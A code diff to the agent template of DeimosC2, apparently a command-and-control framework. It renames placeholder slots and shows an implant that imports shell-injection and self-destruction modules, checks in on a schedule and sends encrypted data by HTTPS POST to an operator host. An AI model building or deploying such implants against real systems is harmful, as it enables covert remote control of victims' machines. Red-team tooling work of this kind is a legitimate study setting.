@@ -17,8 +17,8 @@ import (
 	"runtime"
 	"strconv"
 	mrand "math/rand"
-	{{HIDDEN_CRYPT}}
-	{{HIDDEN_ESNI_IMPORT}}
+	{{DYNAMIC_IMPORTS}}
+
 	"github.com/DeimosC2/DeimosC2/agents/resources/agentfunctions"
 	"github.com/DeimosC2/DeimosC2/agents/resources/selfdestruction"
 	"github.com/DeimosC2/DeimosC2/agents/resources/shellinject"
@@ -44,16 +44,20 @@ var checkin = "/{{CHECKIN}}"
 var moduleloc = "/{{MODULELOC}}"
 var pivotloc = "/{{PIVOTLOC}}"
 var modPort int
-{{HIDDEN_FRONTDOMAIN}}
-{{HIDDEN_ACTDOMAIN}}
-{{HIDDEN_HTTPCLIENT}}
+
+{{DYNAMIC_VARIABLES}}
+
 
 //ModData is used for RPC
 type ModData int
 
 func main() {
-	{{HIDDEN_CODE_BLOCK_MAIN}}
+	//Listener public key converted to bytes
+	pubKey = []byte(stringPubKey)
 
+	{{DYNAMIC_MAIN_CODE}}
+
+	
 	for {
 		agentfunctions.CheckTime(liveHours)
 		if key == "" || key == "000000000000000000000000000000000000"{
@@ -96,7 +100,7 @@ func sendMsg(msgType string, data []byte) []byte {
 	encMsg := crypto.Encrypt(data, aesKey)
 	final := append(encPub, encMsg...)
 	fullMessage = final
-	r, err := {{HIDDEN_HTTP_POST_CALL}}.Post(("https://" + {{HIDDEN_HOST}} + ":" + port + msgType), "application/json", bytes.NewBuffer(fullMessage))
+	r, err := {{DYNAMIC_HTTP_POST_CALL}}
 	if err != nil {
 		agentfunctions.ErrHandling(err.Error())
 	}
